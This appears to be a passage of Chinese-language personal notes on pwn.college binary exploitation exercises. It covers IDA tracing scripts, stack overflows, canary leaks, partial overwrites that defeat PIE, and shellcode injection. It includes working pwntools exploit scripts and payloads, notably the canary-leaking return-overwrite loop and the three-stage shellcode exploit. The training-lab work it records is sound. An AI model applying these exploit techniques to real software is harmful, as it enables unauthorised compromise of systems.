+<h4 id="STM"><a href="#STM" class="headerlink" title="STM:"></a>STM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tSTM: *%s = %s\n&quot;</span>, s1, s2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM:"></a>LDM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> mem = AL;<br>msg(<span class="hljs-string">&quot;\tLDM: %s = *(%s); mem:0x%x\n&quot;</span>, s1, s2, mem);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP:"></a>CMP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> r1=get_wide_byte(RBP<span class="hljs-number">-0x2</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RBP<span class="hljs-number">-0x1</span>);<br>msg(<span class="hljs-string">&quot;\tCMP: %s:%s 0x%x:0x%x\n&quot;</span>, s1, s2, r1, r2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="print-all-regs"><a href="#print-all-regs" class="headerlink" title="print all regs:"></a>print all regs:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> r1=get_wide_byte(RDI+<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RDI+<span class="hljs-number">1025</span>);<br><span class="hljs-keyword">auto</span> r3=get_wide_byte(RDI+<span class="hljs-number">1026</span>);<br><span class="hljs-keyword">auto</span> r4=get_wide_byte(RDI+<span class="hljs-number">1027</span>);<br><span class="hljs-keyword">auto</span> r5=get_wide_byte(RDI+<span class="hljs-number">1028</span>);<br><span class="hljs-keyword">auto</span> r6=get_wide_byte(RDI+<span class="hljs-number">1029</span>);<br><span class="hljs-keyword">auto</span> r7=get_wide_byte(RDI+<span class="hljs-number">1030</span>);<br><br>msg(<span class="hljs-string">&quot;\t    [V] r1:0x%x r2:0x%x r3:0x%x r4:0x%x r5:0x%x r6:0x%x r7:0x%x\n&quot;</span>, r1,r2,r3,r4,r5,r6,r7);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>
+
+<p>设置完之后就会出现非常漂亮的一个输出, 不过很长, 而且这种输出是会跟着程序流变化的, 不利于整体上的静态分析. 下次尝试避开所有跳转, 按顺序打印出所有的代码, 不然跳来跳去的真的很难看.</p>
+<p>结果就是简单的判断字符串相等, 总共9字节. 都在log文件里.</p>
+<h3 id="level17-1"><a href="#level17-1" class="headerlink" title="level17"></a>level17</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br></code></pre></div></td></tr></table></figure>
+
+<p>先跳过, 感觉就是复杂度的堆积, 又或者是我方向错了. 到时回来看.</p>
+<h1 id="module-8"><a href="#module-8" class="headerlink" title="module 8"></a>module 8</h1><ul>
+<li>时至2022年4月22日, c语言排名<a target="_blank" rel="noopener" href="https://www.tiobe.com/tiobe-index/">第二位</a>, 历史最低为第二位. 大部分逆向工具反编译出的结果都是类C语言, 因为c语言是最接近汇编的语言, 还给了开发者一种使用高级语言而不是直接通过汇编去操作寄存器的选择, 被大量使用在操作系统和其他软件的代码中. 而c语言的内存完全控制所带来的问题在near future不会消失, 比如说一些嵌入式设备需要c语言来开发等等.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) 	<span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><p>stack canary mitigations:</p>
+<ul>
+<li><p><strong>leak the canary.</strong> </p>
+</li>
+<li><p><strong>brute-force the canary(for forking processes)</strong> </p>
+</li>
+<li><p><strong>modify the canary.</strong>  </p>
+</li>
+<li><p>by forking processes, it can test repeatedly and figure out what the canary is.</p>
+</li>
+<li><p>the canary begins with null-byte.</p>
+</li>
+</ul>
+</li>
+<li><p>alsr mitigation:</p>
+<ul>
+<li>because all segments are aligned to 0x1000, so changing the least significant byte in a pointer can redirect the flow to another position.</li>
+<li><code>setarch x86_64 -R /bin/zsh</code> command</li>
+</ul>
+</li>
+<li><p>uninitilized data.</p>
+<ul>
+<li>but gcc with high level optimization will probably remove the memset function, as it seems to be pointless.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>整了pwndbg+tmux的组合视图, 感觉, 有一点点点点用吧…<p hidden>我是真有精力搞这个…</p>成功在tmux里面套娃screen.</li>
+<li>使用gdb加上core文件 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8305866/">stackoverflow</a> <ul>
+<li><strong>ulimit -c unlimited</strong> : 解除core dump文件大小限制, 或者直接加在zshrc里面.</li>
+<li>然后<code>gdb-pwndbg [filename] [coredump]</code> </li>
+<li>视频中使用了cyclic加上gdb core来查看返回地址从而发现buf的溢出位置.</li>
+<li>也可以使用valgrind, 不过参数较多.</li>
+</ul>
+</li>
+</ul>
+<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1-2"></a>level1-2</h4><p>简单的忘记了</p>
+<h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3-4"></a>level3-4</h4><p>修改返回地址. </p>
+<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>gdb 调试出现问题, read一个大数字就会bad address, 直接执行没有出现….</p>
+<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>重复利用堆栈, 修改返回地址后顺手改写rbp+0x4开始的四字节为0x1337(4919)</p>
+<p>challenge堆栈有没有实用的位置, 应该就是对齐.</p>
+<p>发现没啥特别的, 就是固定0x40000地址, 然后跳过win_auth的验证条件直接执行read flag</p>
+<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p>
+<ul>
+<li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li>
+<li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p>
+<p>而且加了PIE. 如同上一题的做法.</p>
+<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a target="_blank" rel="noopener" href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p>
+<p>最大的问题是开了canary.</p>
+<p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p>
+<p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p>
+<p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p>
+<img src="../../image/pwn-modules/image-20220426223702228.png" srcset="/img/loading.gif" lazyload alt="image-20220426223702228" style="zoom:80%;" />
+
+<p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p>
+<p>所以结果也很简单, 0x3000字节即可.</p>
+<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p>
+<p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p>
+<ul>
+<li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li>
+<li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li>
+<li>这么一说感觉得用pwntools来写了.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span>	<span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p>
+<p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p>
+<p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure>
+<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p>
+<p>………….</p>
+<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="module9"><a href="#module9" class="headerlink" title="module9"></a>module9</h1><p>nothing special.</p>
+<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p>
+<p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p>
+<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>保护全关. 可执行栈. 确实没有什么东西, 没开PIE的话栈的位置都是一样的, shellcode注入的地点也可以使用绝对地址来确定.</p>
+<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><img src="../../image/pwn-modules/image-20220430102917561.png" srcset="/img/loading.gif" lazyload alt="image-20220430102917561" style="zoom:80%;" />
+
+<p>栈上的地址最低12位都是随机的. 怕不是每次运行的时候_start和__libc_start_main函数都会用到不同的栈空间大小…也许是aslr把stackbase也改了.<br>这下子只能连rbp都给leak出来了.</p>
+<ol>
+<li>first exec <code>challenge</code> to <strong>leak canary</strong> and inject <strong>shellcode</strong>.</li>
+<li>second exec to leak first challenge’s <strong>rbp</strong>, and then calc the shellcode position.</li>
+<li>third exec to jmp to shellcode.</li>
+</ol>
+<p><del>不对, 第一次leak canary的时候也可以leak出main的rbp,</del> 没事了, main的rbp可以用但没必要.</p>
+<ul>
+<li>没有push imm64这条指令.</li>
+<li>一开始用chmod+.ascii “flag”的做法, 发现自己加了一个空字符, 只能通过栈来尝试. 想了想, 栈指针加8也不会对第一个challenge的栈帧造成什么影响. 换成下面这个, 注意小端法.<br><code>[hex(ord(character)) for character in &#39;/flag&#39;] =&gt; [&#39;0x2f&#39;, &#39;0x66&#39;, &#39;0x6c&#39;, &#39;0x61&#39;, &#39;0x67&#39;]</code> </li>
+<li>没料到手写shellcode会有一堆的空字符. 放弃手写, 转为pwntool生成.</li>
+<li>size写太大, REPEAT后面的换行符都给读进去了.</li>
+<li>招架不住canary和rbp里面也有空字符…多试几次就行了</li>
+<li>IDA变量定义错了, 存在一个指向字符数组的指针, read参数还出现了对buf的解引用, 半天没看出来.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#buf在rbp-0x38的位置, canary在rbp-0x8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#binary = glob(&quot;/challenge/t*&quot;)[0]</span><br>binary = <span class="hljs-string">&quot;./toddlerone_level3.1.elf64&quot;</span><br>context.binary = binary<br>p = process(binary) <br><br><span class="hljs-comment">#第一次leak canary</span><br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;bytes)!\n&quot;</span>)<br>shellcode=shellcraft.amd64.chmod(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;0x04&#x27;</span>)<br>payload = asm(shellcode) <br>payload = payload.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;canary&#x27;</span>+canary)<br><br><span class="hljs-comment">#第二次leak rbp</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;64&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>rbp_byte = p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rbp = <span class="hljs-built_in">int</span>.from_bytes(rbp_byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp = &#x27;</span>+<span class="hljs-built_in">hex</span>(rbp))<br><br><span class="hljs-comment">#第三次执行shellcode.</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;200&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rbp-<span class="hljs-number">0x40</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4>
             </div>
             <hr>
             <div>
